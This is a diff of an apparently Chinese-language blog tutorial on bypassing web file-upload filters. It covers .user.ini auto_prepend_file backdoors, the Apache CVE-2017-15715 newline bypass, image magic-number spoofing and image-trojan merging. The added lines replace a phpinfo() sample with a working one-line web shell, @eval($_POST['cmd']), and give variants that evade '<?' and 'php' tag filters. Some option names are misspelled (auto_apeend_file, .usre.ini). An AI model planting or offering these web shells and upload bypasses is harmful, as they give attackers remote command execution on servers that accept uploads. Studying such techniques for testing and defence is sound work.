@@ -53,13 +53,21 @@
 
 <h3 id="4-3-上传-user-ini-绕过黑名单"><a href="#4-3-上传-user-ini-绕过黑名单" class="headerlink" title="4.3 上传 .user.ini 绕过黑名单"></a>4.3 上传 .user.ini 绕过黑名单</h3><p>PHP 5.3.0 起支持每个目录的INI文件配置，此类文件仅被 CGI&#x2F;FastCGI SAPI 处理，只要是以 fastcgi 运行的 php 都可以用这个方法，nginx 和 iis 下都可以。默认文件名为 <strong>.user.ini</strong> </p>
 <p>因此，利用 <strong>.user.ini</strong> 中的两个配置选项可以构造后门</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.php</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">auto_apeend_file = <span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在访问该网站的php文件时，会自动先加载1.php</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.php		<span class="comment"># 是在文件前插入</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">auto_apeend_file = <span class="number">1</span>.php		<span class="comment"># 文件最后才插入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在访问该网站的php文件时，会自动先加载1.php</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>这两个选项的作用是，在 php 文件加载前，提前加载一个文件，如同 <code>require</code> 函数</p>
 </blockquote>
 <p>于是，可以往 <strong>.user.ini</strong> 中写入如下内容并上传：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
-<p>然后上传写入一句话木马的 shell.png 文件，访问该文件即可绕过</p>
+<p>利用条件：</p>
+<ul>
+<li>在  user.ini  中设置 auto_prepend_file&#x3D;a.gif</li>
+<li>在 a.gif 中写入一句话木马</li>
+<li>在当前目录下还有一个 php 文件，如 index.php</li>
+</ul>
+<blockquote>
+<p>如果这三个条件在同一个目录下面，就会出先问题，这里就相当于在 index.php 中写了 <code>include &quot;a.gif&quot;</code>  , 可以进行文件包含，导致的后果是：当我们对目录中的 index.php 进行访问的时候，会调用 .usre.ini  中的文件把 a.gif 文件以 php 的形式进行读取，造成 userini 的漏洞</p>
+</blockquote>
 <h3 id="4-4-Apache-CVE-2017-15715漏洞"><a href="#4-4-Apache-CVE-2017-15715漏洞" class="headerlink" title="4.4 Apache CVE-2017-15715漏洞"></a>4.4 Apache CVE-2017-15715漏洞</h3><p>在HTTPD 2.4.0到2.4.29版本中， <strong>FilesMatch</strong> 指令正则中 <strong>“$”</strong> 能够匹配到换行符，可能导致黑名单绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 
@@ -105,10 +113,16 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46           //jpg</span><br><span class="line">47 49 46 38 39 61                       //gif (GIF89a)</span><br><span class="line">89 50 4E 47                             //png</span><br></pre></td></tr></table></figure>
 
 <p>然后在幻数后加上自己的一句话代码就可以了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h4 id="7-1-3-图片马绕过"><a href="#7-1-3-图片马绕过" class="headerlink" title="7.1.3 图片马绕过"></a>7.1.3 图片马绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 2.jpg      <span class="comment"># /b 指定以二进制格式复制、合并文件，用于图像、声音类文件；/a 指定以ASCII格式复制、合并文件，用于txt等文档类文件</span></span><br></pre></td></tr></table></figure>
 
 <p>上传图片马无法直接利用，需要配合文件解析或文件包含漏洞</p>
+<h4 id="7-1-4-绕过-lt-php"><a href="#7-1-4-绕过-lt-php" class="headerlink" title="7.1.4 绕过 &lt;? php"></a>7.1.4 绕过 <code>&lt;?</code> <code>php</code></h4><p>绕过 <code>&lt;?</code> 可以使用下面语句绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过 <code>php</code> 可以使用下面语句绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);=<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="7-2-imagecreatefromjpeg绕过"><a href="#7-2-imagecreatefromjpeg绕过" class="headerlink" title="7.2 imagecreatefromjpeg绕过"></a>7.2 imagecreatefromjpeg绕过</h3><p><strong>imagecreatefromjpeg</strong> 方法会渲染图像生成新的图像，在图像中注入脚本代码经过渲染后，脚本代码会消失</p>
 <p>该方法也有了成熟的绕过脚本：<a target="_blank" rel="noopener" href="https://github.com/BlackFan/jpg_payload">jpg_payload</a></p>
 <p>绕过需要先上传正常图片文件，再下载回渲染后的图片，运行 <strong>jpg_payload.php</strong> 处理下载回来的图片，将代码注入图片中，然后上传新生成的图片，这样经过 <strong>imagecreatefromjpeg</strong> 后注入的脚本代码依然存在</p>
